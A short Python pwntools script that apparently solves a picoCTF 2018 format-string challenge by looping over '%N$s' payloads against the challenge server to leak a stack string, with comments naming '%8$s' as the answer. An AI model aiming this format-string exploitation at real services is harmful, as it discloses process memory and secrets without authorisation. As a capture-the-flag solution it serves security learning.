#! /usr/bin/env python

from pwn import *

context.log_level = 'critical'

host, port = '2018shell.picoctf.com', 3981

# the solution is to send to print the '8th' string/parameter
# %8$s
# also solved by doing the following increment
# %p %s
# %p %p %s
# %p %p %p %s
# ...
# %p %p %p %p %p %p %p %s


for i in range(10):

	s = remote(host,port)

	s.recvuntil('> ')
	sendstring = '%' + str(i) + '$s'
	s.sendline(sendstring)
	print sendstring
	response = s.recv()

	if 'dumped core' in response:
		print "segfault"
	else:
		print response

	s.close()
